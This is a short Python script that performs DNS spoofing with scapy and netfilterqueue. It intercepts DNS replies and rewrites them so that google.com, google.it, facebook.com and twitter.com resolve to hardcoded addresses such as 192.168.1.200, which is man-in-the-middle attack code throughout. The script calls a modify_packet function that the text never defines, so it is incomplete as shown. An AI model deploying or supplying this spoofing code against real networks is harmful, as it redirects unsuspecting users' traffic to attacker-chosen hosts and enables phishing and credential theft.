from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

#dns dictionary
dns_hosts = {
    b"www.google.com.": "192.168.1.200",
    b"google.com.": "192.168.1.200",
    b"google.it.": "192.168.1.200",
    b"facebook.com.": "172.217.19.142",
    b"twitter.com.": "172.217.19.142",
}

def process_packet(packet):
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary())
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()